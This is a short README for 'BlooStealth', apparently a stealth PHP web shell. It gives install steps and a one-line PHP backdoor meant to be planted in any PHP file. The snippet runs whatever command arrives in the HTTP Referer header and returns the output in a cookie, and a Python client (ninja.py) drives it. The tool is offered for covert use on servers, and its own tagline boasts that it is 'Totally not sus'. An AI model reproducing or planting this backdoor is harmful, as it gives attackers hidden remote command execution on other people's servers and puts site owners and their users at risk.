# BlooStealth
Plant it in any PHP file. Totally not *sus*

## Installation

```bash
$ sudo apt-get install python3-pip
$ sudo apt-get install python3-urllib3
$ git clone https://github.com/bloos3rpent/bloostealth && cd bloostealth
```

## Usage

Upload `ninja.php` in the server OR insert the ff. php code anywhere in a PHP file.

```php
<? if(isset($_SERVER['HTTP_REFERER'])){$_=$_SERVER['HTTP_REFERER'];$b = `$_`;session_destroy();setcookie("x", $b, time()+30*24*60*60);} ?>
```

```bash
python3 ninja.py
```

Now we can access it by inputting the bloostealth URL in the prompt

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License
[Bloos3rpent](https://github.com/bloos3rpent)
